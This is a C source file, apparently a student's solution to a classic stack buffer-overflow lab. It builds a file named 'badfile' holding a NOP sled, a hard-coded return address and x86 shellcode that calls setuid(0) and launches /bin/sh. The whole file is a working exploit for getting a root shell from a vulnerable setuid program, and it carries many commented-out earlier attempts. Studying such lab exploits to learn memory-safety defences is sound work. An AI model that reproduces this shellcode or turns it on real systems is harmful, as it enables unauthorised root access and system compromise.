/* exploit.c
 */
/* A program that creates a file containing code for launching shell*/
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
char shellcode[]=
"\x6a\x17"
"\x58"
"\x31\xdb"
"\xcd\x80"
"\x31\xc0"
"\x50"
"\x68""//sh"
"\x68""/bin"
"\x89\xe3"
"\x50"
"\x53"
"\x89\xe1"
"\x99"
"\xb0\x0b"
"\xcd\x80"
;

unsigned long get_sp(void)
{
    /* This function (suggested in alephOne's paper) prints the 
       stack pointer using assembly code. */
    __asm__("movl %esp,%eax");
}


void main(int argc, char **argv)
{
	char buffer[517];
	FILE *badfile;

	/* Initialize buffer with 0x90 (NOP instruction) */
	memset(&buffer, 0x90, 517);
	
	/* You need to fill the buffer with appropriate contents here */
	/* ... */
	
	//char buffer_address[] = "\x54\xef\xff\xbf";
	char shellcode_address[] = "\xcf\xef\xff\xbf";

	//long shellcode_address = 0xBFFFEFCF;
	//long retaddr;
	
	int i = 0;

	//char *ptr;
	//long *addrptr;
	//ptr = buffer;
	//addrptr = (long*)(ptr);

	//retaddr = get_sp() + 200;

	//for(i = 0; i < 10; i++) *(addrptr++) = retaddr;
	//char nopslide[24];
	//memset(&nopslide, 0x43, 24);
	//int j = 0;
	
	buffer[24] = shellcode_address[0];
	buffer[25] = shellcode_address[1];
	buffer[26] = shellcode_address[2];
	buffer[27] = shellcode_address[3];
	//buffer[28] = '\0';
	//for( i = 24; i < 28; i++){
	//	buffer[i] = shellcode_address[i-24];
	//}
	//for( i = 28; i < 40; i++) buffer[i] = '\0';
	/*for( i = 32; i < 64; i++){
		buffer[i] = shellcode[i-32];
	}*/
	
	int num = sizeof(buffer) - (sizeof(shellcode) + 1);

	for( i = 0; i < strlen(shellcode); i++){
		buffer[num+i] = shellcode[i];
	}

	buffer[sizeof(buffer) - 1] = '\0';

	/* Save the contents to the file "badfile" */
	badfile = fopen("./badfile", "w");
	fwrite(buffer, 517, 1, badfile);
	fclose(badfile);
}
